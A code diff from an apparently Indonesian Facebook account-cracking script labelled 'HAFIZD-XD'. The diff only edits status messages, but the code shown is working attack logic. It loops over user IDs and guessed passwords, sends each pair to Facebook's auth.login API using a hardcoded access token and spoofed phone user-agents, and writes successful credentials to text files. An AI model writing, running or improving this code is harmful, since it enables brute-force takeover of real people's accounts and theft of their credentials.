@@ -122,7 +122,7 @@ class Main:
 			"NokiaC3-00/5.0 (07.20) Profil/MIDP-2.1 Konfigurasi/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, seperti Gecko) Safari/420+]"
 		])
 		sys.stdout.write(
-			"\r\r%sHAFIZD-XD %s/%s -> \033[0;97m CP👉:%s \033[0;97m OK👉:%s "%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r%sHAFIZD-XD %s/%s -> \033[0;97m CP👉%s \033[0;97m OK👉%s "%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -139,12 +139,12 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r\033[0;93mHAFIZD-XD CP|%s | %s\033[0;93m         "%(uid, pw))
+				print("\r\033[0;93m[HAFIZD-XD] username:%s sandi:%s\033[0;93m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
 				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r\033[92;1mHAFIZD-XD OK|%s | %s\033[92;1m         "%(uid, pw))
+				print("\r\033[92;1m[HAFIZD-XD] username:%s sandi:%s\033[92;1m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
